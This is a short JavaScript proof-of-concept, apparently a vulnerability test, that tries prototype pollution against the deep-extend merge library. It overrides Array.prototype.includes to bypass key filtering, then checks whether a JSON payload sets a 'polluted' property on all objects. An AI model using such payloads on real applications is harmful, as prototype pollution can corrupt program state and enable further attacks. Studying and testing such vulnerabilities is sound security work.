Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const merge = require('deep-extend');
const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);